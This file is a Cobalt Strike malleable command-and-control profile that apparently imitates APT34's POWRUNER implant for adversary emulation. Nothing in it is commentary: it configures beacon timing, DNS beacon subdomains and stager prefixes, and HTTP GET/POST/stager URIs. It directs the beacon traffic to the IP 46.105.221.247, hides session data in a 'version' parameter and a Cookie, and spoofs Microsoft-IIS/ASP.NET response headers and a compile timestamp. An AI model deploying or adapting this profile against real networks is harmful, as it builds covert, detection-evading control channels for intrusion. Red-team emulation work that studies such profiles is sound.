#powruner - APT34
#taken from --> https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html
#xx0hcd


set sleeptime "30000";
set jitter    "20";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}


http-get {

    set uri "/update_wapp2.aspx";
    
    client {

        header "Host" "46.105.221.247";
        header "Connection" "Keep-Alive";
	
        
        metadata {
            netbios;
            parameter "version";


        }


    }

    server {

	header "Cache-Control" "private";
	header "Content-Type" "text/plain; charset=utf-8";	
	header "Server" "Microsoft-IIS/8.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
        

        output {
            netbios;
	    prepend "     ";
	    prepend "not_now";
            print;
        }
    }
}

http-post {
    
    set uri "/update_Wapp2.aspx";
    set verb "GET";

    client {
       
	header "Host" "46.105.221.247";
        header "Connection" "Keep-Alive";
        
        output {
            netbios;
	    parameter "version";


        }
             
        id {
            base64url;
	    header "Cookie";

        }
    }

    server {

	header "Cache-Control" "private";
	header "Content-Type" "text/plain; charset=utf-8";	
	header "Server" "Microsoft-IIS/8.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/Update_wapp2.aspx";
	set uri_x64 "/update_wapP2.aspx";

    client {
	header "Host" "46.105.221.247";
	header "Connection" "Keep-Alive";
    }

    server {
        header "Cache-Control" "private";
	header "Content-Type" "text/plain; charset=utf-8";	
	header "Server" "Microsoft-IIS/8.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
    
    }


}

stage {
	#random
	set compile_time "07 Dec 2017 12:08:22";
	set userwx "false";
	set obfuscate "false";
	set image_size_x86 "305000";



}
